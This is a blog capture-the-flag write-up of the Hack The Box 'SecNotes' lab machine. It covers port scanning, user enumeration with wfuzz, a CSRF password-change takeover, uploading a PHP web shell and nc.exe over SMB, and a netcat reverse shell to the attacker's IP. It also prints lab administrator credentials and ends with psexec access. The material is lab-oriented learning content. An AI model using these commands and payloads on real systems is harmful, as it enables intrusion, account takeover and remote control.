<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Secnotes - DiegoExploit
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P385GSF');</script>
<!-- End Google Tag Manager -->
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>DiegoExploit</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>

</ul>
<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
</ul>




</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <br>
  <h1 id="Hack-The-Box-Secnotes"><a href="#Hack-The-Box-Secnotes" class="headerlink" title="Hack The Box - Secnotes"></a>Hack The Box - Secnotes</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. Italso teaches about Windows Subsystem for Linux enumeration. Its IP address is <code>10.10.10.97</code> Letâ€™s go to hack!!!<br><img src="/images/hackthebox/exploit/secnotes/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
<p>As always we will start with <code>nmap</code> to scan for open ports and services:
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |
 |-->{SFire129}#nmap -p- -T 4 10.10.10.97
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:45 EDT
 Nmap scan report for 10.10.10.97
 Host is up (0.18s latency).
 Not shown: 65532 filtered ports
 PORT     STATE SERVICE
 80/tcp   open  http
 445/tcp  open  microsoft-ds
 8808/tcp open  ssports-bcast
 
 Nmap done: 1 IP address (1 host up) scanned in 323.90 seconds </figure></pre>

<h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
 <p>The Output show differents ports on web service http:
 <img src="/images/hackthebox/exploit/secnotes/1.png" alt=""></p>
 <p>IIS service default web page.
 <img src="/images/hackthebox/exploit/secnotes/2.png" alt=""></p>
 <p>In the registe section create an user:
 <img src="/images/hackthebox/exploit/secnotes/3.png" alt=""></p>
 <p>Test user created.
  <img src="/images/hackthebox/exploit/secnotes/5.png" alt=""></p>
 <p>Intercept the traffic with Burpsuite for know the request.
 <img src="/images/hackthebox/exploit/secnotes/4.png" alt=""></p>
 <p>Test the field for cross site scripting:
 <img src="/images/hackthebox/exploit/secnotes/5.4.png" alt=""></p>
 <p>The pop-up show vulnerability.
 <img src="/images/hackthebox/exploit/secnotes/5.3.png" alt=""></p>
 <p>test with another user, for look the output message. The message is <code>no account found with that username</code>
 <img src="/images/hackthebox/exploit/secnotes/5.1.png" alt=""></p>
 <p>With wfuzz tool, run for enumerate users web page <code>wfuzz -z file,/usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=1234567" --hs "No account found with that username" http://10.10.10.97/login.php</code>. The output reveal 2 users.
 <img src="/images/hackthebox/exploit/secnotes/5.2.png" alt=""></p>
 <p>In section "Contact Us" test the XSS with netcat server running on http port.
  <img src="/images/hackthebox/exploit/secnotes/6.png" alt=""></p>
  <p>In kali linux crete a file html for test remote file inclusion:
 <img src="/images/hackthebox/exploit/secnotes/7.png" alt=""></p>
 <p>Run http server on Kali Linux
 <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                                                                                                
 |-->{SFire129}#python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 10.10.14.20 - - [07/Jul/2020 22:48:25] "GET / HTTP/1.1" 200 -
 10.10.14.20 - - [07/Jul/2020 22:48:26] code 404, message File not found
 10.10.14.20 - - [07/Jul/2020 22:48:26] "GET /favicon.ico HTTP/1.1" 404 -
 10.10.14.20 - - [07/Jul/2020 22:48:28] "GET /test.html HTTP/1.1" 200 -  </figure></pre>
 <p>Run the html file we will to view the change password.
 <img src="/images/hackthebox/exploit/secnotes/9.png" alt=""></p>
 <p>Copy the url script <code>http://10.10.10.97/change_pass.php?password=Colombia1&confirm_password=Colombia1&submit=submit</code> for change the tyler user password.
 <img src="/images/hackthebox/exploit/secnotes/10.png" alt=""></p>
 <p>Auth with tyler user in web page.
 <img src="/images/hackthebox/exploit/secnotes/11.png" alt=""></p>
 <p>Browsing in web page we found the user administrator and password too.
 <img src="/images/hackthebox/exploit/secnotes/12.png" alt=""></p>
  <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
 <p>with smbmap, enumerate the target with user administrator found:
 <pre><figure class="highlight plain">   |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                                                                                                
 |-->{SFire129}#smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97 
 [+] IP: 10.10.10.97:445 Name: 10.10.10.97                                       
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
         C$                                                      NO ACCESS       Default share
         IPC$                                                    READ ONLY       Remote IPC
         new-site                                                READ, WRITE
 -------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                                                                                                
 |-->{SFire129}#smbclient -U tyler   -L //10.10.10.97                                                                                           
 Enter WORKGROUP\tyler's password: 
 
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
         new-site        Disk      
 SMB1 disabled -- no workgroup available
 |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                                                                                                
 |-->{SFire129}#smbclient -U tyler  //10.10.10.97/new-site                                                                                    
 Enter WORKGROUP\tyler's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Jul  8 20:50:37 2020
   ..                                  D        0  Wed Jul  8 20:50:37 2020
   iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
   iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
 
                 12978687 blocks of size 4096. 8112717 blocks available
 smb: \>   </figure></pre>
 <p>Put the nc.exe and cmd.php on web server by smb connection.
 <pre><figure class="highlight plain">   smb: \> put cmd.php 
 putting file cmd.php as \cmd.php (0.1 kb/s) (average 0.1 kb/s)
 smb: \> put nc.exe 
 putting file nc.exe as \nc.exe (37.4 kb/s) (average 22.2 kb/s)
 smb: \>  </figure></pre>
 <p>cmd.php content.
 <img src="/images/hackthebox/exploit/secnotes/8.png" alt=""></p>
 <p>In the web browser <code>http://10.10.10.97:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.20+9001</code> and run the netcat on Kali linux:
 <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                     
 |-->{SFire129}#nc -lnvp 9001                                          
 listening on [any] 9001 ...
 connect to [10.10.14.20] from (UNKNOWN) [10.10.10.97] 59884
 Microsoft Windows [Version 10.0.17134.228]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\inetpub\new-site>whoami
 whoami
 secnotes\tyler
 
 C:\inetpub\new-site> </figure></pre>
 <h2 id="Get_privileges"><a href="#Get_privileges" class="Get_privileges" title="Get_privileges"></a>Get_privileges</h2>
 <p>Running the winPEAS.exe and Sherlock.ps1 scripts, not shown interesting information about the target, therefore, browsing in each one directories, we found the file bash.lnk, this file belong to linux configuration.
 <img src="/images/hackthebox/exploit/secnotes/13.png" alt=""></p>
 <p>Inside the file, show a information about the location bash.exe file.
 <img src="/images/hackthebox/exploit/secnotes/14.png" alt=""></p>
 <p>Therefore, the file was not found on location windows\system32, but with the command <code>dir /b/s bash.exe</code> was possible to found.
 <img src="/images/hackthebox/exploit/secnotes/15.png" alt=""></p>
 <p>Running the bash.exe was possible to connect to ubuntu system and to get information in the bash_history about the administrtor user system.
 <pre><figure class="highlight plain"> cd root
 ls
 filesystem
 ls -la
 total 8
 drwx------ 1 root root  512 Jun 22  2018 .
 drwxr-xr-x 1 root root  512 Jun 21  2018 ..
 ---------- 1 root root  398 Jun 22  2018 .bash_history
 -rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
 cat .bash_history
 cd /mnt/c/
 ls
 cd Users/
 cd /
 cd ~
 ls
 pwd
 mkdir filesystem
 mount //127.0.0.1/c$ filesystem/
 sudo apt install cifs-utils
 mount //127.0.0.1/c$ filesystem/
 mount //127.0.0.1/c$ filesystem/ -o user=administrator
 cat /proc/filesystems
 sudo modprobe cifs
 smbclient
 apt install smbclient
 smbclient
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
 > .bash_history 
 less .bash_history
 exit  </figure></pre>
 <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
 <p>Connect with psexec.py script and with credentials administrator to the target.
 <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/secnotes)
 |                                                                                                                                                                                                                                          
 |-->{SFire129}#psexec.py administrator@10.10.10.97
 Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
 
 Password:
 [*] Requesting shares on 10.10.10.97.....
 [*] Found writable share ADMIN$
 [*] Uploading file CMYzIzqK.exe
 [*] Opening SVCManager on 10.10.10.97.....
 [*] Creating service JcmJ on 10.10.10.97.....
 [*] Starting service JcmJ.....
 
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17134.228]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\WINDOWS\system32>
 C:\WINDOWS\system32>cd ..
  
 C:\Windows>cd ..
  
 tyC:type Users\tyler\Desktop\user.txt
 ***Here you could find the user flag***
 
  C:\>type Users\Administrator\Desktop\root.txt
 ***Here you could find the root flag***
 
 C:\></figure></pre>
 
 
<p> And we owned root !</p>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.png" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>DiegoExploit</div>
      <div>2020-07-09</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#psexec</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#xss</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
